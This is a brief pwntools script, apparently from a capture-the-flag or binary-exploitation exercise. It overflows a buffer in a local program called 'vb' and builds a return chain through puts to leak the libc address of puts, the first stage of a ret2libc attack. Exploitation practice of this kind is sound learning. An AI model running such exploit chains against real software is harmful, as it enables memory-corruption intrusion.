from pwn import *

vb = ELF('vb')
put_plt = vb.symbols['puts']
put_got = vb.got['puts']

vulnerable_func = 0x0848436
print p32(put_plt)
print p32(vulnerable_func)
print p32(put_got)

shellcode = 512 * 'A'
shellcode += p32(put_plt) + p32(vulnerable_func) + p32(put_got)

p = process(['./vb', shellcode])
put_addr = u32(p.recv(4))
print 'put_addr = ' + hex(put_addr)
